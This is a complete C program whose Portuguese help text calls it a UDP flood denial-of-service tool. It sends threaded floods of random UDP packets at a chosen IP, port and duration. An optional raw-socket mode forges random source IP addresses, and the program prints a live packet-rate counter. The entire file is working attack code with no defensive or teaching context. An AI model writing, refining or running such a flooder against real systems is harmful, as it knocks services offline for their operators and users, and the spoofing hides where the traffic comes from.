#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <errno.h>

#define MAX_PACKET 65535
#define DEFAULT_THREADS 10
#define DEFAULT_SIZE 1024
#define MAX_THREADS 100

typedef struct {
    char target[64];
    int port;
    int duration;
    int packet_size;
    int thread_id;
} attack_args_t;

volatile int attack_running = 1;
volatile unsigned long long packets_sent = 0;

unsigned short checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1) {
        sum += *(unsigned char *)buffer;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void random_payload(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() & 0xFF;
    }
}

void *raw_socket_attack(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    unsigned char *payload;
    int packet_size;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        sockfd = socket(AF_INET, SOCK_DGRAM, 0);
        if (sockfd < 0) {
            printf("[Thread %d] Erro ao criar socket\n", args->thread_id);
            return NULL;
        }
        
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(args->port);
        inet_pton(AF_INET, args->target, &target_addr.sin_addr);
        
        unsigned char *udp_packet = malloc(args->packet_size);
        end_time = time(NULL) + args->duration;
        
        while (attack_running && time(NULL) < end_time) {
            random_payload(udp_packet, args->packet_size);
            sendto(sockfd, udp_packet, args->packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr));
            packets_sent++;
        }
        
        free(udp_packet);
        close(sockfd);
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        printf("[Thread %d] Erro ao configurar socket\n", args->thread_id);
        close(sockfd);
        return NULL;
    }

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + args->packet_size;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
        payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

        uint32_t src_ip = (rand() & 0xFF) << 24 |
                          (rand() & 0xFF) << 16 |
                          (rand() & 0xFF) << 8 |
                          (rand() & 0xFF);

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 64 + (rand() % 64);
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = src_ip;
        ip_header->daddr = target_addr.sin_addr.s_addr;

        udp_header->source = htons(1024 + (rand() % 64511));
        udp_header->dest = htons(args->port);
        udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
        udp_header->check = 0;

        random_payload(payload, args->packet_size);

        ip_header->check = checksum((unsigned short *)packet, packet_size);

        sendto(sockfd, packet, packet_size, 0,
               (struct sockaddr *)&target_addr, sizeof(target_addr));
        packets_sent++;
    }

    close(sockfd);
    return NULL;
}

void *udp_attack(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    unsigned char *packet;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("[Thread %d] Erro ao criar socket UDP\n", args->thread_id);
        return NULL;
    }

    int buffer_size = 1024 * 1024 * 2;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    packet = malloc(args->packet_size);
    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        random_payload(packet, args->packet_size);
        sendto(sockfd, packet, args->packet_size, 0,
               (struct sockaddr *)&target_addr, sizeof(target_addr));
        packets_sent++;
    }

    free(packet);
    close(sockfd);
    return NULL;
}

void print_stats() {
    static time_t last_print = 0;
    static unsigned long long last_packets = 0;
    time_t now = time(NULL);
    
    if (now - last_print >= 1) {
        unsigned long long diff = packets_sent - last_packets;
        printf("\r[+] Pacotes enviados: %llu | PPS: %llu     ", 
               packets_sent, diff);
        fflush(stdout);
        last_print = now;
        last_packets = packets_sent;
    }
}

void *stats_thread(void *arg) {
    while (attack_running) {
        print_stats();
        usleep(100000);
    }
    return NULL;
}

void print_usage(char *program_name) {
    printf("\n=== UDP FLOOD DOS TOOL ===\n\n");
    printf("Uso: %s <IP> <PORTA> <TEMPO> [OPCOES]\n\n", program_name);
    printf("Argumentos obrigatorios:\n");
    printf("  IP       - Endereco IP do alvo\n");
    printf("  PORTA    - Porta de destino\n");
    printf("  TEMPO    - Duracao do ataque em segundos\n\n");
    printf("Opcoes:\n");
    printf("  -t       - Numero de threads (padrao: %d, max: %d)\n", DEFAULT_THREADS, MAX_THREADS);
    printf("  -s       - Tamanho do pacote em bytes (padrao: %d, max: 1472)\n", DEFAULT_SIZE);
    printf("  -r       - Usar raw socket (requer privilegios)\n");
    printf("  -h       - Mostrar esta ajuda\n\n");
    printf("Exemplos:\n");
    printf("  %s 192.168.1.1 80 30\n", program_name);
    printf("  %s 192.168.1.1 443 60 -t 20 -s 1400 -r\n", program_name);
    printf("\n");
}

int main(int argc, char *argv[]) {
    char *target;
    int port, duration;
    int num_threads = DEFAULT_THREADS;
    int packet_size = DEFAULT_SIZE;
    int use_raw = 0;
    int opt;

    if (argc < 4) {
        print_usage(argv[0]);
        return 1;
    }

    target = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);

    optind = 4;
    while ((opt = getopt(argc, argv, "t:s:rh")) != -1) {
        switch (opt) {
            case 't':
                num_threads = atoi(optarg);
                if (num_threads > MAX_THREADS) num_threads = MAX_THREADS;
                if (num_threads < 1) num_threads = 1;
                break;
            case 's':
                packet_size = atoi(optarg);
                if (packet_size > 1472) packet_size = 1472;
                if (packet_size < 64) packet_size = 64;
                break;
            case 'r':
                use_raw = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    printf("\n=== INICIANDO ATAQUE ===\n");
    printf("Alvo: %s\n", target);
    printf("Porta: %d\n", port);
    printf("Duracao: %d segundos\n", duration);
    printf("Threads: %d\n", num_threads);
    printf("Tamanho do pacote: %d bytes\n", packet_size);
    printf("Tipo de socket: %s\n", use_raw ? "RAW (requer privilegios)" : "UDP");
    printf("==========================\n\n");

    srand(time(NULL) ^ getpid());
    signal(SIGPIPE, SIG_IGN);

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    attack_args_t *args = malloc(num_threads * sizeof(attack_args_t));

    for (int i = 0; i < num_threads; i++) {
        strncpy(args[i].target, target, sizeof(args[i].target) - 1);
        args[i].port = port;
        args[i].duration = duration;
        args[i].packet_size = packet_size;
        args[i].thread_id = i;

        if (use_raw) {
            pthread_create(&threads[i], NULL, raw_socket_attack, &args[i]);
        } else {
            pthread_create(&threads[i], NULL, udp_attack, &args[i]);
        }
    }

    pthread_t stats_thread_id;
    pthread_create(&stats_thread_id, NULL, stats_thread, NULL);

    sleep(duration);
    attack_running = 0;

    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }

    pthread_cancel(stats_thread_id);
    pthread_join(stats_thread_id, NULL);

    printf("\n\n[+] Ataque finalizado!\n");
    printf("[+] Total de pacotes enviados: %llu\n", packets_sent);
    printf("[+] Media de PPS: %llu\n", packets_sent / duration);

    free(threads);
    free(args);

    return 0;
}